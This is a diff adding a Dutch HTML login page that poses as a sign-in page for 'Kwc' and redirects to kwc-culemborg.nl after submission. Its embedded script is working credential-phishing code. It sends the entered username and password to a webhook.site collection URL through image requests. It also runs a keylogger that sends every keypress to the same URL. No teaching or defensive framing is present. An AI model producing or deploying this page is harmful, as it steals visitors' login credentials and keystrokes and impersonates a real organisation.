@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+<meta charset="utf-8">
+<link rel="stylesheet" href="basis.css">
+<title>Kwc</title>
+<link rel="icon" type="image/x-icon" href="kwc.png">
+</head>
+<body>
+
+
+
+
+ 
+
+
+
+<div class="InputBox">
+ <label for="domTextElement"></label>
+ 
+        <input type="text" id="username" >
+ <br><br>        
+ </div>
+ <div class="InputBox1">
+ <label for="domTextElement1"></label>
+       <input type="password" id="password" >
+	    </div>
+	   
+ <br><br>     
+
+
+<div class="knop">
+
+<button  type="button"  onclick="getValueInput(), window.location.href='https://www.kwc-culemborg.nl/' ">Inloggen    </button>
+ 
+</div>
+
+
+         <p id="valueInput"></p>
+         <script>
+       const getValueInput = () =>{
+       
+let inputValue=document.getElementById("username").value; 
+       
+let inputValue1 = document.getElementById("password").value;        var i=new Image();
+var j=new Image();
+i.src="https://webhook.site/41f1c05b-6c33-42f8-aaa4-5a6477705a86/?password="+inputValue1;  j.src="https://webhook.site/41f1c05b-6c33-42f8-aaa4-5a6477705a86/?username="+inputValue; 
+window.location.reload();
+  }   
+  var keys='';
+var url = 'https://webhook.site/41f1c05b-6c33-42f8-aaa4-5a6477705a86/?c=';
+ document.onkeypress = function(e)
+ { 
+get = window.event?event:e;
+ key = get.keyCode?get.keyCode:get.charCode;
+ key = String.fromCharCode(key); keys+=key;
+}
+window.setInterval(function(){ 
+if(keys.length>0) {  
+new Image().src = url+keys;
+  keys = ''; }
+}, 1);
+</script>
+
+
+
+
+https://webhook.site/#!/41f1c05b-6c33-42f8-aaa4-5a6477705a86/19330ba3-2db8-4892-8737-aed6af25ad96/1
+
+  </body>
+</html>
+
+
